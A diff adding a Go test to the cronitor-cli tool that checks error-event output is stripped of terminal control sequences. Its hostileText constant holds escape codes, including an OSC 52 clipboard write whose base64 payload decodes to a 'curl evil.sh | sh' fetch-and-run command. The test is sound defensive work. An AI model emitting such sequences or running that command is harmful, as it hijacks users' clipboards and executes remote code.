@@ -6,6 +6,7 @@ import (
 	"strings"
 	"testing"
 	"time"
+	"unicode"
 
 	"github.com/cronitorio/cronitor-cli/internal/testutil"
 	"github.com/spf13/viper"
@@ -468,5 +469,77 @@ func TestErrorsEvents_JSONAndBadEventID(t *testing.T) {
 	output, code, _ = executeWithExit("errors", "events", testGroupID, "abc")
 	if code != 1 || !strings.Contains(output, "32 hex characters") || mock.RequestCount() != 0 {
 		t.Fatalf("exit %d, requests %d:\n%s", code, mock.RequestCount(), output)
+	}
+}
+
+// hostileText is what anyone holding a telemetry key can put in an event or
+// log record: clear the screen, write the clipboard (OSC 52), move the
+// cursor up (C1 CSI) and return to the start of the line.
+const hostileText = `\u001b[2J\u001b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\u0007\u009b1A\r`
+
+// assertNoTerminalControls fails if output has any control character but
+// a newline or tab.
+func assertNoTerminalControls(t *testing.T, output string) {
+	t.Helper()
+	for _, r := range output {
+		if r != '\n' && r != '\t' && unicode.IsControl(r) {
+			t.Fatalf("output has control character %U:\n%q", r, output)
+		}
+	}
+	if strings.Contains(output, "52;c;") {
+		t.Errorf("the OSC 52 payload should be stripped with its sequence:\n%q", output)
+	}
+}
+
+func TestErrorsRenderingStripsTerminalControls(t *testing.T) {
+	h := hostileText
+	event := `{"event_id": "` + testEventID + `", "stamp": "2026-10-29T03:00:00.000000Z", "level": "error` + h + `",
+		"title": "Boom` + h + `", "message": "msg` + h + `", "exception_type": "BoomError` + h + `",
+		"exception_value": "first line` + h + `\nsecond line", "culprit": "job` + h + `",
+		"transaction": "tx` + h + `", "logger": "lg` + h + `", "server_name": "srv` + h + `",
+		"release": "rel` + h + `", "environment": "prod` + h + `", "series": "run` + h + `",
+		"monitor": {"key": "nightly` + h + `"}, "user": {"id": "u` + h + `", "email": "e` + h + `"},
+		"sdk": {"name": "sdk` + h + `", "version": "1` + h + `"}, "tags": {"tag` + h + `": "val` + h + `"},
+		"payload": {"breadcrumbs": [], "exception": {"values": [{"type": "BoomError` + h + `", "module": "app` + h + `",
+			"value": "first line` + h + `\nsecond line",
+			"stacktrace": {"frames": [{"filename": "/app/job` + h + `.py", "function": "main` + h + `",
+				"lineno": 3, "context_line": "raise BoomError()` + h + `", "in_app": true}]}}]}}}`
+	group := `{"group": "` + testGroupID + `", "title": "Boom` + h + `", "culprit": "job` + h + `",
+		"exception_type": "BoomError` + h + `", "level": "error", "levels": ["error", "fatal` + h + `"], "count": 1,
+		"environment": "prod` + h + `", "monitors": [{"key": "nightly` + h + `"}], "services": [{"key": "api` + h + `"}],
+		"first_seen": "2026-10-29T03:00:00.000000Z", "last_seen": "2026-10-29T03:00:00.000000Z` + h + `",
+		"sparkline": [], "latest_event": ` + event + `}`
+
+	mock := testutil.NewMockAPI()
+	defer mock.Close()
+	mock.On("GET", "/errors", 200, `{"page": 1, "page_count": 1, "page_size": 50, "total_count": 1, "data": [`+group+`]}`)
+	mock.On("GET", "/errors/"+testGroupID, 200, group)
+	mock.On("GET", "/errors/"+testGroupID+"/events", 200, `{"data": [`+event+`], "has_more": true, "next": "2026-10-29T03:00:00.000000Z`+h+`"}`)
+	mock.On("GET", "/errors/"+testGroupID+"/events/"+testEventID, 200, event)
+	withReadAPITest(t, mock)
+
+	detail := []string{
+		"BoomError: first line\nsecond line\n", // multi-line values keep their line breaks
+		`File "/app/job.py", line 3, in main`,
+		"    raise BoomError()\n",
+		"Tags: tag=val\n",
+		"Series:       run\n",
+	}
+	for _, tc := range []struct {
+		args []string
+		want []string
+	}{
+		{[]string{"errors", "list"}, []string{"Boom", "nightly"}},
+		{[]string{"errors", "get", testGroupID}, append([]string{"Boom\n", "Culprit:      job\n", "Monitors:     nightly\n", "Services:     api\n"}, detail...)},
+		{[]string{"errors", "events", testGroupID}, []string{"Boom", "nightly", "run", "next: 2026-10-29T03:00:00.000000Z"}},
+		{[]string{"errors", "events", testGroupID, testEventID}, append([]string{"Boom\n"}, detail...)},
+	} {
+		resetErrorsFlags()
+		output, code, err := executeWithExit(tc.args...)
+		if err != nil || code != 0 {
+			t.Fatalf("%v: exit %d err %v\n%s", tc.args, code, err, output)
+		}
+		assertNoTerminalControls(t, output)
+		assertContainsAll(t, output, tc.want...)
 	}
 }
